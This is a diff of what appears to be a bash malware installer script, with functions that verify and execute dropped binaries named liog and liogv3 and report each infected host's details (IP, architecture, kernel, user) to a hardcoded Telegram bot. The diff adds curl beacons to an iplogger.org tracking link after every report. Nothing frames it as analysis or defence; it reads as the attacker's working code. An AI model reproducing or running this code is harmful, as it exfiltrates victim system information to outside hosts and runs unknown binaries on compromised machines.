@@ -43,6 +43,7 @@ function hash() {
                         sum=$(md5sum $d|grep bd538fb57bfdaa144bf3857790a63204|grep -v grep |wc -l)
                         if [ $sum -eq 1 ]; then
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' found run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+				curl -A post-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                                 exit 0
                         else
 #                                cd /tmp
@@ -52,6 +53,7 @@ function hash() {
                                 chomd 777 liog && ./liog
 #                                cd /tmp && rm m liog
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+				curl -A post-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                         fi
                 else
                         echo 'no sum'
@@ -64,8 +66,10 @@ function hash() {
 #                cd /tmp && rm m liog
                 if [  "$me" == "root" ]; then
                         wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+			curl -A post-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                 else
                         wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+			curl -A post-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                         exit 0
                 fi
         fi
@@ -80,6 +84,7 @@ function hash32() {
                         sum=$(md5sum $d|grep e110622f88718718664afc6873c61587|grep -v grep |wc -l)
                         if [ $sum -eq 1 ]; then
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+				curl -A Arch32-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                                 exit 0
                         else
  #                               cd /tmp
@@ -88,6 +93,7 @@ function hash32() {
                                 chmod 777 liogv3 && ./liogv3
 #                                cd /tmp && rm liog
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+				curl -A Arch32-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                         fi
                 else
                         echo 'no sum'
@@ -100,7 +106,9 @@ function hash32() {
 #               cd /tmp && rm liogv3
                 if [  "$me" == "root" ]; then
                         wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -                                                                     else
+			curl -A arch32-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                         wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
+			curl -A arch32-success/1.9 -sLo /dev/null https://iplogger.org/2NZW36
                         exit 0
                 fi
         fi
